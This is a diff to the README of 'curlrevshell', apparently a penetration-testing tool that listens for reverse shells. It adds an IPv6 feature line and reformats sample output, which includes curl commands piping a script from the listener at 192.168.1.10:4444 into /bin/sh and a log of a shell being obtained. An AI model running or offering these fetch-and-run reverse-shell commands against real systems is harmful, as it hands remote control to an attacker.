@@ -10,6 +10,7 @@ but with the following "features":
 - Like, lots
 - Optionally serves static files
 - Accepts multiple shells in series, like `nc -lk` but in color
+- IPv6-ready
 
 For legal use only
 
@@ -40,12 +41,10 @@ go: downloading golang.org/x/text v0.14.0
 $ curlrevshell
 01:04:42.760 Listening on 0.0.0.0:4444
 01:04:42.760 To get a shell:
-01:04:42.760
-01:04:42.760 curl -sk --pinnedpubkey "sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=" https://127.0.0.1:4444/c | /bin/sh
-01:04:42.760 curl -sk --pinnedpubkey "sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=" https://192.168.1.10:4444/c | /bin/sh
-01:04:42.760 curl -sk --pinnedpubkey "sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=" https://[::1]:4444/c | /bin/sh
-01:04:42.760 curl -sk --pinnedpubkey "sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=" https://[fe80::1]:4444/c | /bin/sh
-01:04:42.760
+
+curl -sk --pinnedpubkey "sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=" https://127.0.0.1:4444/c | /bin/sh
+curl -sk --pinnedpubkey "sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=" https://192.168.1.10:4444/c | /bin/sh
+
 01:04:55.247 [192.168.1.20] Sent script: ID:zcj5vz3zp6ce URL:192.168.1.10:4444
 01:04:55.259 [192.168.1.20] Got a shell: ID:zcj5vz3zp6ce
 > id
